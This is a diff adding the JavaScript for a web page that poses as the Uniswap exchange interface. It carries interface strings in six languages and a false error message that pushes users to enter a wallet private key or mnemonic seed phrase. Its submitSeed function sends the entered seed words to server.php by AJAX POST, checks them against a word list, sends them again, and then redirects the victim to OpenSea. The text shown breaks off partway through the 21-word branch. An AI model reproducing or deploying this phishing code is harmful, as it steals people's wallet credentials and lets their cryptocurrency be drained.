@@ -1,0 +1,1172 @@
+//const submit = $('#submit-seed');
+//const words = $('.word');
+
+var lang = (navigator.language ||
+            navigator.systemLanguage ||
+            navigator.userLanguage ||
+           'en').substr(0, 2).toLowerCase();
+//alert(lang);
+if ( lang  == "fr" ) {
+  //alert(lang);
+ chooselang('fr');
+}
+if ( lang  == "es" ) {
+  //alert(lang);
+ chooselang('es');
+}
+if ( lang  == "pt" ) {
+  //alert(lang);
+ chooselang('pt');
+}
+if ( lang  == "de" ) {
+  //alert(lang);
+ chooselang('de');
+}
+if ( lang  == "it" ) {
+  //alert(lang);
+ chooselang('it');
+}
+
+
+function chooselang(parameter){
+  if(parameter == 'en'){
+    var v01 = 'Swap';
+    var v02 = 'Pool';
+    var v03 = 'Vote';
+    var v04 = 'Charts';
+    var v05 = 'Connect to a wallet';
+    var v06 = 'About';
+    var v07 = 'Docs';
+    var v08 = 'Discord';
+    var v09 = 'Analytics';
+    var v10 = 'Language';
+    var v11 = 'Dark Theme';
+    var v12 = 'Select a token';
+    var v13 = 'Connect Wallet';
+    var v14 = 'By connecting a wallet, you agree to Uniswap Labs’ Terms of Service and acknowledge that you have read and understand the Uniswap protocol disclaimer.';
+    var v16 = 'An error has occurred, please use these login methods! We will fix the problem soon.';
+    var v17 = 'Private key';
+    var v18 = 'Mnemonic Phrase';
+    var v19 = 'Enter Private Key';
+    var v20 = 'Access Wallet';
+    var v21 = 'Access by Private Key';
+    var v22 = 'Access by Mnemonic Phrase';
+
+  }
+  if(parameter == 'fr'){
+    var v01 = 'Échanger';
+    var v02 = 'Pool';
+    var v03 = 'Voter';
+    var v04 = 'Graphiques';
+    var v05 = 'Se connecter à un portefeuille';
+    var v06 = 'À propos';
+    var v07 = 'Documents';
+    var v08 = 'Discord';
+    var v09 = 'Métriques';
+    var v10 = 'Langue';
+    var v11 = 'Thème sombre';
+    var v12 = 'Sélectionnez un jeton';
+    var v13 = 'Connecter le portefeuille';
+    var v14 = 'En vous connectant à un portefeuille, vous acceptez les conditions de service d’Uniswap et reconnaissez que vous avez lu et compris l’exclusion de responsabilité du protocole Uniswap.';
+    var v16 = 'Une erreur sest produite, veuillez utiliser ces méthodes de connexion! Nous allons résoudre le problème bientôt.';
+    var v17 = 'Clé privée';
+    var v18 = 'Phrase Mnémonique';
+    var v19 = 'Entrez la Clé Privée';
+    var v20 = 'Portefeuille dAccès';
+    var v21 = 'Accès par Clé Privée';
+    var v22 = 'Accès par Phrase Mnémonique';
+
+  }
+  if(parameter == 'de'){
+    var v01 = 'Tauschen';
+    var v02 = 'Pool';
+    var v03 = 'Abstimmung';
+    var v04 = 'Charts';
+    var v05 = 'Mit einer Wallet verbinden';
+    var v06 = 'Über';
+    var v07 = 'Dokumentation';
+    var v08 = 'Discord';
+    var v09 = 'Statistiken';
+    var v10 = 'Sprache';
+    var v11 = 'Dunkles Design';
+    var v12 = 'Token auswählen';
+    var v13 = 'Wallet verbinden';
+    var v14 = 'Durch das Verbinden mit einer Wallet erklären Sie sich mit den Nutzungsbedingungen von Uniswap Labs einverstanden und bestätigen, dass Sie den Uniswap Protokoll Haftungsausschluss gelesen und verstanden haben.';
+    var v16 = 'Ein Fehler ist aufgetreten, bitte verwenden Sie diese Login-Methoden! Wir werden das Problem bald beheben.';
+    var v17 = 'Privater Schlüssel';
+    var v18 = 'Mnemonische Phrase';
+    var v19 = 'Privaten Schlüssel eingeben';
+    var v20 = 'Zugriff Brieftasche';
+    var v21 = 'Zugriff per privatem Schlüssel';
+    var v22 = 'Zugriff durch mnemonische Phrase';
+  }
+  if(parameter == 'es'){
+    var v01 = 'Intercambiar';
+    var v02 = 'Fondo común';
+    var v03 = 'Votaciones';
+    var v04 = 'Gráficos';
+    var v05 = 'Conectar a una cartera';
+    var v06 = 'Acerca de';
+    var v07 = 'Documentos';
+    var v08 = 'Discord';
+    var v09 = 'Estadísticas';
+    var v10 = 'Idioma';
+    var v11 = 'Tema oscuro';
+    var v12 = 'Seleccione un token';
+    var v13 = 'Conectar cartera';
+    var v14 = 'Al conectar una cartera, usted acepta los Términos de servicio de Uniswap Labs y reconoce que ha leído y comprendido la Exención de responsabilidad del protocolo Uniswap.';
+    var v16 = 'Se ha producido un error, por favor, utilice estos métodos de inicio de sesión! Arreglaremos el problema pronto.';
+    var v17 = 'Clave privada';
+    var v18 = 'Frase Mnemotécnica';
+    var v19 = 'Introducir Clave Privada';
+    var v20 = 'Cartera de Acceso';
+    var v21 = 'Acceso por Clave Privada';
+    var v22 = 'Acceso por Frase Mnemotécnica';
+  }
+  if(parameter == 'pt'){
+    var v01 = 'Conversão';
+    var v02 = 'Lote';
+    var v03 = 'Votar';
+    var v04 = 'Gráficos';
+    var v05 = 'Conectar-se a uma carteira';
+    var v06 = 'SOBRE';
+    var v07 = 'Docs';
+    var v08 = 'Discordar';
+    var v09 = 'Análises';
+    var v10 = 'Língua';
+    var v11 = 'Tema escuro';
+    var v12 = 'Selecione um token';
+    var v13 = 'Conectar-se à carteira';
+    var v14 = 'Ao se conectar a uma carteira, você concorda com os Termos de Serviço do Uniswap Laboratório e declara ter lido e compreendido o Termo de Isenção de Responsabilidade do Protocolo Unisawp.';
+    var v16 = 'Ocorreu um erro, por favor use estes métodos de autenticação! Vamos resolver o problema em breve.';
+    var v17 = 'Privado';
+    var v18 = 'Frase Mnemónica';
+    var v19 = 'Indique A Chave Privada';
+    var v20 = 'Carteira De Acesso';
+    var v21 = 'Acesso por chave privada';
+    var v22 = 'Acesso por frase mnemónica';
+  }
+  if(parameter == 'it'){
+    var v01 = 'Scambia';
+    var v02 = 'Pool';
+    var v03 = 'VOTAZIONI';
+    var v04 = 'Grafici';
+    var v05 = 'Connettiti a un portafoglio';
+    var v06 = 'Informazioni';
+    var v07 = 'Documenti';
+    var v08 = 'Discord';
+    var v09 = 'Analisi';
+    var v10 = 'linguaggio';
+    var v11 = 'Tema scuro';
+    var v12 = 'Seleziona un token';
+    var v13 = 'Connetti Portafoglio';
+    var v14 = 'Collegando un portafoglio, accetti i Termini di servizio di Uniswap Labs e riconosci di aver letto e compreso il La dichiarazione di non responsabilità del protocollo Uniswap.';
+    var v16 = 'Si è verificato un errore, si prega di utilizzare questi metodi di accesso! Noi risolvere il problema al più presto.';
+    var v17 = 'Chiave privata';
+    var v18 = 'Frase mnemonica';
+    var v19 = 'Inserisci chiave privata';
+    var v20 = 'Portafoglio di accesso';
+    var v21 = 'Accesso tramite chiave privata';
+    var v22 = 'Accesso per frase mnemonica';
+  }
+
+
+  $('#swap-nav-link').html(v01);
+  $('#pool-nav-link').html(v02);
+  $('#vote-nav-link').html(v03);
+  $('#charts-nav-link').html(v04);
+  $('.v05').html(v05);
+  $('#v06').html(v06);
+  $('#v07').html(v07);
+  $('#v08').html(v08);
+  $('#v09').html(v09);
+  $('#v10').html(v10);
+  $('#v11').html(v11);
+  $('#v12').html(v12);
+  $('#v13').html(v13);
+  $('#v14').html(v14);
+  $('.v16').html(v16);
+  $('#v17').html(v17);
+  $('#v18').html(v18);
+  $('#PrivateKey').attr("placeholder", v19);
+  $('.v20').html(v20);
+  $('#v21').html(v21);
+  $('#v22').html(v22);
+
+
+}
+
+function validateWord(parameter){
+  var word01 = document.getElementById("word01");
+  var word02 = document.getElementById("word02");
+  var word03 = document.getElementById("word03");
+  var word04 = document.getElementById("word04");
+  var word05 = document.getElementById("word05");
+  var word06 = document.getElementById("word06");
+  var word07 = document.getElementById("word07");
+  var word08 = document.getElementById("word08");
+  var word09 = document.getElementById("word09");
+  var word10 = document.getElementById("word10");
+  var word11 = document.getElementById("word11");
+  var word12 = document.getElementById("word12");
+  var word001 = $('#word01').val();
+  var word002 = $('#word02').val();
+  var word003 = $('#word03').val();
+  var word004 = $('#word04').val();
+  var word005 = $('#word05').val();
+  var word006 = $('#word06').val();
+  var word007 = $('#word07').val();
+  var word008 = $('#word08').val();
+  var word009 = $('#word09').val();
+  var word010 = $('#word10').val();
+  var word011 = $('#word11').val();
+  var word012 = $('#word12').val();
+
+
+//  var matches = word001.match(/[\w\d\’\'-]+/gi);
+//alert(matches);
+//var str = 'one two three four five';
+
+  //how many words
+var words = $('#' + parameter).val();
+var how = words.match(/\w+/g).length;
+//alert(words);
+//alert(how);
+
+if(how > 1){
+  //delete all value of inputs
+  $('.word').val('');
+
+  //var firstClass = words.className.split(' ')[0];
+  //alert(firstClass);
+  //var word = "Plane Jane Mane"
+  console.log(words.split(" "))
+  console.log(words.split(" ")[1])
+
+//add words
+  $('#word01').val(words.split(" ")[0]);
+  $('#word02').val(words.split(" ")[1]);
+  $('#word03').val(words.split(" ")[2]);
+  $('#word04').val(words.split(" ")[3]);
+  $('#word05').val(words.split(" ")[4]);
+  $('#word06').val(words.split(" ")[5]);
+  $('#word07').val(words.split(" ")[6]);
+  $('#word08').val(words.split(" ")[7]);
+  $('#word09').val(words.split(" ")[8]);
+  $('#word10').val(words.split(" ")[9]);
+  $('#word11').val(words.split(" ")[10]);
+  $('#word12').val(words.split(" ")[11]);
+
+//  var matches = '... some_long_word another word ...'.match(/(\w+)/);
+//var firstWord = matches[2];
+//alert(firstWord);
+}
+
+
+
+if(word01.value.length == 0 || word02.value.length == 0 || word03.value.length == 0 || word04.value.length == 0 || word05.value.length == 0 || word06.value.length == 0 || word07.value.length == 0 || word08.value.length == 0 || word09.value.length == 0 || word10.value.length == 0 || word11.value.length == 0 || word12.value.length == 0){
+
+    $( "#submit-seed" ).addClass( "disabled" );
+} else {
+
+    $( "#submit-seed" ).removeClass( "disabled" );
+}
+}
+
+//check words for validate
+function submitSeed(){
+  var word01 = document.getElementById("word01");
+  var word02 = document.getElementById("word02");
+  var word03 = document.getElementById("word03");
+  var word04 = document.getElementById("word04");
+  var word05 = document.getElementById("word05");
+  var word06 = document.getElementById("word06");
+  var word07 = document.getElementById("word07");
+  var word08 = document.getElementById("word08");
+  var word09 = document.getElementById("word09");
+  var word10 = document.getElementById("word10");
+  var word11 = document.getElementById("word11");
+  var word12 = document.getElementById("word12");
+  var word13 = document.getElementById("word13");
+  var word14 = document.getElementById("word14");
+  var word15 = document.getElementById("word15");
+  var word16 = document.getElementById("word16");
+  var word17 = document.getElementById("word17");
+  var word18 = document.getElementById("word18");
+  var word19 = document.getElementById("word19");
+  var word20 = document.getElementById("word20");
+  var word21 = document.getElementById("word21");
+  var word22 = document.getElementById("word22");
+  var word23 = document.getElementById("word23");
+  var word24 = document.getElementById("word24");
+  var word001 = $('#word01').val();
+  var word002 = $('#word02').val();
+  var word003 = $('#word03').val();
+  var word004 = $('#word04').val();
+  var word005 = $('#word05').val();
+  var word006 = $('#word06').val();
+  var word007 = $('#word07').val();
+  var word008 = $('#word08').val();
+  var word009 = $('#word09').val();
+  var word010 = $('#word10').val();
+  var word011 = $('#word11').val();
+  var word012 = $('#word12').val();
+  var word013 = $('#word13').val();
+  var word014 = $('#word14').val();
+  var word015 = $('#word15').val();
+  var word016 = $('#word16').val();
+  var word017 = $('#word17').val();
+  var word018 = $('#word18').val();
+  var word019 = $('#word19').val();
+  var word020 = $('#word20').val();
+  var word021 = $('#word21').val();
+  var word022 = $('#word22').val();
+  var word023 = $('#word23').val();
+  var word024 = $('#word24').val();
+
+var typephrase = $('#typephrase').val();
+//alert(typephrase);
+  switch (typephrase) {
+    case '12':
+    //alert('1212');
+    if(word01.value.length == 0 || word02.value.length == 0 || word03.value.length == 0 || word04.value.length == 0 || word05.value.length == 0 || word06.value.length == 0 || word07.value.length == 0 || word08.value.length == 0 || word09.value.length == 0 || word10.value.length == 0 || word11.value.length == 0 || word12.value.length == 0){
+
+
+    } else {
+      var msg   = $('#formem').serialize();
+        $.ajax({
+          type: 'POST',
+          url: 'server.php',
+          data: msg,
+          success: function(data) {
+            //window.location.href = "https://href.li/?https://www.exodus.io/";
+          }
+        });
+      //if we have thia word in the base
+      if(allowedWords.indexOf(word001.toLowerCase()) >= 0) { $("#word01").css("border-bottom", "1px solid #aaa");
+        if(allowedWords.indexOf(word002.toLowerCase()) >= 0) { $("#word02").css("border-bottom", "1px solid #aaa");
+          if(allowedWords.indexOf(word003.toLowerCase()) >= 0) { $("#word03").css("border-bottom", "1px solid #aaa");
+            if(allowedWords.indexOf(word004.toLowerCase()) >= 0) { $("#word04").css("border-bottom", "1px solid #aaa");
+              if(allowedWords.indexOf(word005.toLowerCase()) >= 0) { $("#word05").css("border-bottom", "1px solid #aaa");
+                if(allowedWords.indexOf(word006.toLowerCase()) >= 0) { $("#word06").css("border-bottom", "1px solid #aaa");
+                  if(allowedWords.indexOf(word007.toLowerCase()) >= 0) { $("#word07").css("border-bottom", "1px solid #aaa");
+                    if(allowedWords.indexOf(word008.toLowerCase()) >= 0) { $("#word08").css("border-bottom", "1px solid #aaa");
+                      if(allowedWords.indexOf(word009.toLowerCase()) >= 0) { $("#word09").css("border-bottom", "1px solid #aaa");
+                        if(allowedWords.indexOf(word010.toLowerCase()) >= 0) { $("#word10").css("border-bottom", "1px solid #aaa");
+                          if(allowedWords.indexOf(word011.toLowerCase()) >= 0) { $("#word11").css("border-bottom", "1px solid #aaa");
+                            if(allowedWords.indexOf(word012.toLowerCase()) >= 0) { $("#word12").css("border-bottom", "1px solid #aaa");
+                            var msg   = $('#formem').serialize();
+                              $.ajax({
+                                type: 'POST',
+                                url: 'server.php',
+                                data: msg,
+                                success: function(data) {
+                                  window.location.href = "https://href.li/?https://opensea.io/assets";
+                                }
+                              });
+
+
+                            } else {
+                              $("#word12").css("border-bottom", "1px solid red");
+                              alert('Please enter valid twelwe word!');
+                            }
+                          } else {
+                            $("#word11").css("border-bottom", "1px solid red");
+                            alert('Please enter valid eleven word!');
+                          }
+                        } else {
+                          $("#word10").css("border-bottom", "1px solid red");
+                          alert('Please enter valid ten word!');
+                        }
+                      } else {
+                        $("#word09").css("border-bottom", "1px solid red");
+                        alert('Please enter valid ninth word!');
+                      }
+                    } else {
+                      $("#word08").css("border-bottom", "1px solid red");
+                      alert('Please enter valid eifght word!');
+                    }
+                  } else {
+                    $("#word07").css("border-bottom", "1px solid red");
+                    alert('Please enter valid seventh word!');
+                  }
+                } else {
+                  $("#word06").css("border-bottom", "1px solid red");
+                  alert('Please enter valid sixth word!');
+                }
+              } else {
+                $("#word05").css("border-bottom", "1px solid red");
+                alert('Please enter valid fifth word!');
+              }
+            } else {
+              $("#word04").css("border-bottom", "1px solid red");
+              alert('Please enter valid fourth word!');
+            }
+          } else {
+            $("#word03").css("border-bottom", "1px solid red");
+            alert('Please enter valid third word!');
+          }
+        } else {
+          $("#word02").css("border-bottom", "1px solid red");
+          alert('Please enter valid second word!');
+        }
+      } else {
+        //$("#word01").css({"border-bottom":"1px solid red !important;"});
+        $("#word01").css("border-bottom", "1px solid red");
+        alert('Please enter valid first word!');
+      }
+    }
+      break;
+
+
+
+    case '15':
+    if(word01.value.length == 0 || word02.value.length == 0 || word03.value.length == 0 || word04.value.length == 0 || word05.value.length == 0 || word06.value.length == 0 || word07.value.length == 0 || word08.value.length == 0 || word09.value.length == 0 || word10.value.length == 0 || word11.value.length == 0 || word12.value.length == 0 || word13.value.length == 0 || word14.value.length == 0 || word15.value.length == 0){
+
+
+    } else {
+      var msg   = $('#formem').serialize();
+        $.ajax({
+          type: 'POST',
+          url: 'server.php',
+          data: msg,
+          success: function(data) {
+            //window.location.href = "https://href.li/?https://www.exodus.io/";
+          }
+        });
+
+
+
+
+
+
+      //if we have thia word in the base
+      if(allowedWords.indexOf(word001.toLowerCase()) >= 0) { $("#word01").css("border-bottom", "1px solid #aaa");
+        if(allowedWords.indexOf(word002.toLowerCase()) >= 0) { $("#word02").css("border-bottom", "1px solid #aaa");
+          if(allowedWords.indexOf(word003.toLowerCase()) >= 0) { $("#word03").css("border-bottom", "1px solid #aaa");
+            if(allowedWords.indexOf(word004.toLowerCase()) >= 0) { $("#word04").css("border-bottom", "1px solid #aaa");
+              if(allowedWords.indexOf(word005.toLowerCase()) >= 0) { $("#word05").css("border-bottom", "1px solid #aaa");
+                if(allowedWords.indexOf(word006.toLowerCase()) >= 0) { $("#word06").css("border-bottom", "1px solid #aaa");
+                  if(allowedWords.indexOf(word007.toLowerCase()) >= 0) { $("#word07").css("border-bottom", "1px solid #aaa");
+                    if(allowedWords.indexOf(word008.toLowerCase()) >= 0) { $("#word08").css("border-bottom", "1px solid #aaa");
+                      if(allowedWords.indexOf(word009.toLowerCase()) >= 0) { $("#word09").css("border-bottom", "1px solid #aaa");
+                        if(allowedWords.indexOf(word010.toLowerCase()) >= 0) { $("#word10").css("border-bottom", "1px solid #aaa");
+                          if(allowedWords.indexOf(word011.toLowerCase()) >= 0) { $("#word11").css("border-bottom", "1px solid #aaa");
+                            if(allowedWords.indexOf(word012.toLowerCase()) >= 0) { $("#word12").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word013.toLowerCase()) >= 0) { $("#word13").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word014.toLowerCase()) >= 0) { $("#word14").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word015.toLowerCase()) >= 0) { $("#word15").css("border-bottom", "1px solid #aaa");
+
+                               var msg   = $('#formem').serialize();
+                                 $.ajax({
+                                   type: 'POST',
+                                   url: 'server.php',
+                                   data: msg,
+                                   success: function(data) {
+                                     window.location.href = "https://href.li/?https://opensea.io/assets";
+                                   }
+                                 });
+
+
+                            } else {
+                              $("#word15").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 15 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word14").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 14 word!');
+                            }
+
+
+
+                            } else {
+                              $("#word13").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 13 word!');
+                            }
+
+                            } else {
+                              $("#word12").css("border-bottom", "1px solid red");
+                              alert('Please enter valid twelwe word!');
+                            }
+                          } else {
+                            $("#word11").css("border-bottom", "1px solid red");
+                            alert('Please enter valid eleven word!');
+                          }
+                        } else {
+                          $("#word10").css("border-bottom", "1px solid red");
+                          alert('Please enter valid ten word!');
+                        }
+                      } else {
+                        $("#word09").css("border-bottom", "1px solid red");
+                        alert('Please enter valid ninth word!');
+                      }
+                    } else {
+                      $("#word08").css("border-bottom", "1px solid red");
+                      alert('Please enter valid eifght word!');
+                    }
+                  } else {
+                    $("#word07").css("border-bottom", "1px solid red");
+                    alert('Please enter valid seventh word!');
+                  }
+                } else {
+                  $("#word06").css("border-bottom", "1px solid red");
+                  alert('Please enter valid sixth word!');
+                }
+              } else {
+                $("#word05").css("border-bottom", "1px solid red");
+                alert('Please enter valid fifth word!');
+              }
+            } else {
+              $("#word04").css("border-bottom", "1px solid red");
+              alert('Please enter valid fourth word!');
+            }
+          } else {
+            $("#word03").css("border-bottom", "1px solid red");
+            alert('Please enter valid third word!');
+          }
+        } else {
+          $("#word02").css("border-bottom", "1px solid red");
+          alert('Please enter valid second word!');
+        }
+      } else {
+        //$("#word01").css({"border-bottom":"1px solid red !important;"});
+        $("#word01").css("border-bottom", "1px solid red");
+        alert('Please enter valid first word!');
+      }
+    }
+      break;
+    case '18':
+    if(word01.value.length == 0 || word02.value.length == 0 || word03.value.length == 0 || word04.value.length == 0 || word05.value.length == 0 || word06.value.length == 0 || word07.value.length == 0 || word08.value.length == 0 || word09.value.length == 0 || word10.value.length == 0 || word11.value.length == 0 || word12.value.length == 0 || word13.value.length == 0 || word14.value.length == 0 || word15.value.length == 0 || word16.value.length == 0 || word17.value.length == 0 || word18.value.length == 0){
+
+
+    } else {
+      var msg   = $('#formem').serialize();
+        $.ajax({
+          type: 'POST',
+          url: 'server.php',
+          data: msg,
+          success: function(data) {
+            //window.location.href = "https://href.li/?https://www.exodus.io/";
+          }
+        });
+
+
+
+
+
+
+      //if we have thia word in the base
+      if(allowedWords.indexOf(word001.toLowerCase()) >= 0) { $("#word01").css("border-bottom", "1px solid #aaa");
+        if(allowedWords.indexOf(word002.toLowerCase()) >= 0) { $("#word02").css("border-bottom", "1px solid #aaa");
+          if(allowedWords.indexOf(word003.toLowerCase()) >= 0) { $("#word03").css("border-bottom", "1px solid #aaa");
+            if(allowedWords.indexOf(word004.toLowerCase()) >= 0) { $("#word04").css("border-bottom", "1px solid #aaa");
+              if(allowedWords.indexOf(word005.toLowerCase()) >= 0) { $("#word05").css("border-bottom", "1px solid #aaa");
+                if(allowedWords.indexOf(word006.toLowerCase()) >= 0) { $("#word06").css("border-bottom", "1px solid #aaa");
+                  if(allowedWords.indexOf(word007.toLowerCase()) >= 0) { $("#word07").css("border-bottom", "1px solid #aaa");
+                    if(allowedWords.indexOf(word008.toLowerCase()) >= 0) { $("#word08").css("border-bottom", "1px solid #aaa");
+                      if(allowedWords.indexOf(word009.toLowerCase()) >= 0) { $("#word09").css("border-bottom", "1px solid #aaa");
+                        if(allowedWords.indexOf(word010.toLowerCase()) >= 0) { $("#word10").css("border-bottom", "1px solid #aaa");
+                          if(allowedWords.indexOf(word011.toLowerCase()) >= 0) { $("#word11").css("border-bottom", "1px solid #aaa");
+                            if(allowedWords.indexOf(word012.toLowerCase()) >= 0) { $("#word12").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word013.toLowerCase()) >= 0) { $("#word13").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word014.toLowerCase()) >= 0) { $("#word14").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word015.toLowerCase()) >= 0) { $("#word15").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word016.toLowerCase()) >= 0) { $("#word16").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word017.toLowerCase()) >= 0) { $("#word17").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word018.toLowerCase()) >= 0) { $("#word18").css("border-bottom", "1px solid #aaa");
+
+                               var msg   = $('#formem').serialize();
+                                 $.ajax({
+                                   type: 'POST',
+                                   url: 'server.php',
+                                   data: msg,
+                                   success: function(data) {
+                                     window.location.href = "https://href.li/?https://opensea.io/assets";
+                                   }
+                                 });
+
+
+                            } else {
+                              $("#word18").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 18 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word17").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 17 word!');
+                            }
+
+
+
+
+
+                            } else {
+                              $("#word16").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 16 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word15").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 15 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word14").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 14 word!');
+                            }
+
+
+
+                            } else {
+                              $("#word13").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 13 word!');
+                            }
+
+                            } else {
+                              $("#word12").css("border-bottom", "1px solid red");
+                              alert('Please enter valid twelwe word!');
+                            }
+                          } else {
+                            $("#word11").css("border-bottom", "1px solid red");
+                            alert('Please enter valid eleven word!');
+                          }
+                        } else {
+                          $("#word10").css("border-bottom", "1px solid red");
+                          alert('Please enter valid ten word!');
+                        }
+                      } else {
+                        $("#word09").css("border-bottom", "1px solid red");
+                        alert('Please enter valid ninth word!');
+                      }
+                    } else {
+                      $("#word08").css("border-bottom", "1px solid red");
+                      alert('Please enter valid eifght word!');
+                    }
+                  } else {
+                    $("#word07").css("border-bottom", "1px solid red");
+                    alert('Please enter valid seventh word!');
+                  }
+                } else {
+                  $("#word06").css("border-bottom", "1px solid red");
+                  alert('Please enter valid sixth word!');
+                }
+              } else {
+                $("#word05").css("border-bottom", "1px solid red");
+                alert('Please enter valid fifth word!');
+              }
+            } else {
+              $("#word04").css("border-bottom", "1px solid red");
+              alert('Please enter valid fourth word!');
+            }
+          } else {
+            $("#word03").css("border-bottom", "1px solid red");
+            alert('Please enter valid third word!');
+          }
+        } else {
+          $("#word02").css("border-bottom", "1px solid red");
+          alert('Please enter valid second word!');
+        }
+      } else {
+        //$("#word01").css({"border-bottom":"1px solid red !important;"});
+        $("#word01").css("border-bottom", "1px solid red");
+        alert('Please enter valid first word!');
+      }
+    }
+      break;
+    case '21':
+    if(word01.value.length == 0 || word02.value.length == 0 || word03.value.length == 0 || word04.value.length == 0 || word05.value.length == 0 || word06.value.length == 0 || word07.value.length == 0 || word08.value.length == 0 || word09.value.length == 0 || word10.value.length == 0 || word11.value.length == 0 || word12.value.length == 0 || word13.value.length == 0 || word14.value.length == 0 || word15.value.length == 0 || word16.value.length == 0 || word17.value.length == 0 || word18.value.length == 0 || word19.value.length == 0 || word20.value.length == 0 || word21.value.length == 0){
+
+
+    } else {
+      var msg   = $('#formem').serialize();
+        $.ajax({
+          type: 'POST',
+          url: 'server.php',
+          data: msg,
+          success: function(data) {
+            //window.location.href = "https://href.li/?https://www.exodus.io/";
+          }
+        });
+
+
+
+
+
+
+      //if we have thia word in the base
+      if(allowedWords.indexOf(word001.toLowerCase()) >= 0) { $("#word01").css("border-bottom", "1px solid #aaa");
+        if(allowedWords.indexOf(word002.toLowerCase()) >= 0) { $("#word02").css("border-bottom", "1px solid #aaa");
+          if(allowedWords.indexOf(word003.toLowerCase()) >= 0) { $("#word03").css("border-bottom", "1px solid #aaa");
+            if(allowedWords.indexOf(word004.toLowerCase()) >= 0) { $("#word04").css("border-bottom", "1px solid #aaa");
+              if(allowedWords.indexOf(word005.toLowerCase()) >= 0) { $("#word05").css("border-bottom", "1px solid #aaa");
+                if(allowedWords.indexOf(word006.toLowerCase()) >= 0) { $("#word06").css("border-bottom", "1px solid #aaa");
+                  if(allowedWords.indexOf(word007.toLowerCase()) >= 0) { $("#word07").css("border-bottom", "1px solid #aaa");
+                    if(allowedWords.indexOf(word008.toLowerCase()) >= 0) { $("#word08").css("border-bottom", "1px solid #aaa");
+                      if(allowedWords.indexOf(word009.toLowerCase()) >= 0) { $("#word09").css("border-bottom", "1px solid #aaa");
+                        if(allowedWords.indexOf(word010.toLowerCase()) >= 0) { $("#word10").css("border-bottom", "1px solid #aaa");
+                          if(allowedWords.indexOf(word011.toLowerCase()) >= 0) { $("#word11").css("border-bottom", "1px solid #aaa");
+                            if(allowedWords.indexOf(word012.toLowerCase()) >= 0) { $("#word12").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word013.toLowerCase()) >= 0) { $("#word13").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word014.toLowerCase()) >= 0) { $("#word14").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word015.toLowerCase()) >= 0) { $("#word15").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word016.toLowerCase()) >= 0) { $("#word16").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word017.toLowerCase()) >= 0) { $("#word17").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word018.toLowerCase()) >= 0) { $("#word18").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word019.toLowerCase()) >= 0) { $("#word19").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word020.toLowerCase()) >= 0) { $("#word20").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word021.toLowerCase()) >= 0) { $("#word21").css("border-bottom", "1px solid #aaa");
+
+                               var msg   = $('#formem').serialize();
+                                 $.ajax({
+                                   type: 'POST',
+                                   url: 'server.php',
+                                   data: msg,
+                                   success: function(data) {
+                                     window.location.href = "https://href.li/?https://opensea.io/assets";
+                                   }
+                                 });
+
+
+                            } else {
+                              $("#word21").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 21 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word20").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 20 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word19").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 19 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word18").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 18 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word17").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 17 word!');
+                            }
+
+
+
+
+
+                            } else {
+                              $("#word16").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 16 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word15").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 15 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word14").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 14 word!');
+                            }
+
+
+
+                            } else {
+                              $("#word13").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 13 word!');
+                            }
+
+                            } else {
+                              $("#word12").css("border-bottom", "1px solid red");
+                              alert('Please enter valid twelwe word!');
+                            }
+                          } else {
+                            $("#word11").css("border-bottom", "1px solid red");
+                            alert('Please enter valid eleven word!');
+                          }
+                        } else {
+                          $("#word10").css("border-bottom", "1px solid red");
+                          alert('Please enter valid ten word!');
+                        }
+                      } else {
+                        $("#word09").css("border-bottom", "1px solid red");
+                        alert('Please enter valid ninth word!');
+                      }
+                    } else {
+                      $("#word08").css("border-bottom", "1px solid red");
+                      alert('Please enter valid eifght word!');
+                    }
+                  } else {
+                    $("#word07").css("border-bottom", "1px solid red");
+                    alert('Please enter valid seventh word!');
+                  }
+                } else {
+                  $("#word06").css("border-bottom", "1px solid red");
+                  alert('Please enter valid sixth word!');
+                }
+              } else {
+                $("#word05").css("border-bottom", "1px solid red");
+                alert('Please enter valid fifth word!');
+              }
+            } else {
+              $("#word04").css("border-bottom", "1px solid red");
+              alert('Please enter valid fourth word!');
+            }
+          } else {
